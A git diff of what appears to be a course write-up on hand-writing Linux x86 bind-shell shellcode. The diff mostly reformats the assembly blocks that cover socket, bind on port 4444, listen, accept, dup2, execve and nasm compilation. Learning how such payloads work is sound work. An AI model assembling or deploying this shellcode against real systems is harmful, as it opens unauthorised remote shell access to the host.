@@ -262,24 +262,24 @@ Our registers will be:
 - ECX will contain the args : (0x2, 0x1, 0x0)
 
 For the two first register, ASM is easy:
-```
-	xor eax, eax
-	mov al, 0x66
-	xor ebx, ebx
-	mov bl, 1
+```ASM
+xor eax, eax
+mov al, 0x66
+xor ebx, ebx
+mov bl, 1
 ```
 	
 In order to pass the args in ECX we can push them on the stack. The key point is to remember that the stack is a LIFO structure.
-```
-	xor ecx, ecx
-	push ecx
-	push 1
-	push 2
-	mov ecx, esp
+```ASM
+xor ecx, ecx
+push ecx
+push 1
+push 2
+mov ecx, esp
 ```
 
 EAX will now contain a reference to the socket, lets put it in EDI.
-```
+```ASM
 mov edi, eax
 ```
 ### Bind
@@ -317,26 +317,26 @@ For the first structure, values must be pushed on the stack:
 
 Size of the structure is 16 (0x10. As EAX is 8 bytes 0x5c11 and 0x2 must be pushed as word in order to have a structure of size 16.
 
-```
-	xor eax, eax
-	push eax
-	push word 0x5c11	
-	push word 0x2
-	mov edx, esp
+```ASM
+xor eax, eax
+push eax
+push word 0x5c11	
+push word 0x2
+mov edx, esp
 
-	mov al, 0x66
-	mov bl, 2 
-	push 0x10
-	push edx
-	push edi
-	mov ecx, esp
+mov al, 0x66
+mov bl, 2 
+push 0x10
+push edx
+push edi
+mov ecx, esp
 
-	int 0x80
+int 0x80
 ```
 
 ### Listen
 
-then we have to listen for the socket, we will use socketcall with *SYS_LISTEN*.
+Then we have to listen for the socket, we will use socketcall with *SYS_LISTEN*.
 
 ```
 $ for elmt in $(locate net.h); do grep SYS_LISTEN $elmt; done
@@ -347,7 +347,7 @@ $ for elmt in $(locate net.h); do grep SYS_LISTEN $elmt; done
 - EBX will contain 0x4
 - ECX will contain (created_socket, 0)
 
-```
+```ASM
 mov al, 0x66
 mov bl, 4
 xor ecx, ecx
@@ -369,7 +369,7 @@ NULL is 0.
 - EAX will contain 0x66
 - EBX will contain 0x5
 - ECX will contain (my_socket, 0, 0)
-```
+```ASM
 mov al, 0x66
 mov bl, 5
 xor ecx, ecx
@@ -382,7 +382,7 @@ int 0x80
 
 As the result will be used on the next syscall (by EBX), lets put the result in EBX.
 
-```
+```ASM
 mov ebx, eax
 ```
 ### Dup
@@ -398,7 +398,7 @@ $ python3 -c "print(hex(63))"
 - EBX will contain EDI
 - ECX will contain 0/1/2
 
-```
+```ASM
 xor eax, eax
 mov al, 0x3F 
 xor ecx,ecx
@@ -416,7 +416,7 @@ int 0x80
 ```
 
 This can be easily reduce using a loop:
-```	
+```ASM
 ;dup2 for loop
 	xor ecx, ecx
 	mov cl, 2
@@ -441,7 +441,7 @@ $ cat /usr/include/i386-linux-gnu/asm/unistd_32.h |grep execve
 
 In order to call execve, a JMP CALL POP is needed.
 
-```
+```ASM
 jmp callexecve
 
 execve:
@@ -459,7 +459,7 @@ callexecve:
 ### Exit gracefully
 This code is from the course. It must be inserted after execve execution but before *callexecve*.
 
-```
+```ASM
 xor eax, eax
 mov al, 1
 int 0x80
@@ -561,7 +561,7 @@ callexecve:
 
 The compilation si done using *nasm*:
 ```
-nasm -f elf32 -o bind_shellcode.o bind_shellcode.nasm
+$ nasm -f elf32 -o bind_shellcode.o bind_shellcode.nasm
 ```
 
 In order to convert the ASM content to a hexadecimal shellcode a small script is used:
